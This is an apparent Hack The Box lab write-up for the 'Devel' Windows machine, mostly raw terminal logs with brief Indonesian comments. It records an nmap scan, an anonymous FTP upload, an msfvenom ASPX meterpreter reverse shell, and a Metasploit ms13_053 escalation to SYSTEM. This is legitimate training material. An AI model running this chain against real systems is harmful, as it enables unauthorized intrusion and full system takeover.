```bash
┌─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Devel]
└──╼ $sudo nmap -sCV -p-  10.10.10.5 --min-rate 1000 -Pn
[sudo] password for aexon: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 15:16 WIB
Nmap scan report for 10.10.10.5
Host is up (0.31s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 151.12 seconds

```


---

**Check VULN**

di sini saya mencoba upload file ke ftp dan mengakses nya lewat web dan ternyata bisa.

```bash
ftp> put root.txt
```

http://10.10.10.5/root.txt



---



**EXPLOIT**


membuat exploit

```bash
┌─[✗]─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Devel]
└──╼ $msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f aspx > reverse.aspx
fatal: detected dubious ownership in repository at '/usr/share/metasploit-framework'
To add an exception for this directory, call:

	git config --global --add safe.directory /usr/share/metasploit-framework
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2892 bytes

```

setelah berhasil buat payload upload ke ftp, dan access payload tersebut.

```bash
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> 
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 3 opened (10.10.14.6:4444 -> 10.10.10.5:49182) at 2024-09-06 20:28:01 +0700

(Meterpreter 3)(c:\windows\system32\inetsrv) > run post/multi/recon/local_exploit_suggestor

[-] The specified meterpreter session script could not be found: post/multi/recon/local_exploit_suggestor
(Meterpreter 3)(c:\windows\system32\inetsrv) > run post/multi/recon/local_exploit_suggester
[*] 10.10.10.5 - Meterpreter session 3 closed.  Reason: Died


[-] Session not found
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (10.10.14.6:4444 -> 10.10.10.5:49184) at 2024-09-06 20:29:21 +0700

(Meterpreter 4)(c:\windows\system32\inetsrv) > background
[*] Backgrounding session 4...
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/recon/local_exploit_suggester
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> set session 4
session => 4
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...

[*] 10.10.10.5 - 188 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.5 - Valid modules for session 4:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 3   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 9   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 12  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 13  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 15  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 16  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 17  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 18  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 19  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
 20  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 21  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 22  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 23  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
 24  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 25  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 26  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 27  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 28  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 29  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 30  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 31  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store
 32  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 33  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
 34  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 35  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 36  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 37  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 38  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 39  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.
 40  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 41  exploit/windows/local/webexec                                  No                       The check raised an exception.

[*] Post module execution completed
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> 
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> use exploit/windows/local/ms13_053_schlamperei
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> show options

Module options (exploit/windows/local/ms13_053_schlamperei):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.81.165   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 SP0/SP1



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> set lhot tun0
[!] Unknown datastore option: lhot. Did you mean LHOST?
lhot => tun0
[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> set lhost tun0
lhost => 10.10.14.6
[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> set session 4
session => 4
[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> run

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Launching notepad to host the exploit...
[+] Process 3120 launched.
[*] Reflectively injecting the exploit DLL into 3120...
[*] Injecting exploit into 3120...
[*] Found winlogon.exe with PID 440
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 5 opened (10.10.14.6:4444 -> 10.10.10.5:49185) at 2024-09-06 20:33:38 +0700

(Meterpreter 5)(C:\Windows\system32) > whoami
[-] Unknown command: whoami
(Meterpreter 5)(C:\Windows\system32) > shell
Process 3256 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

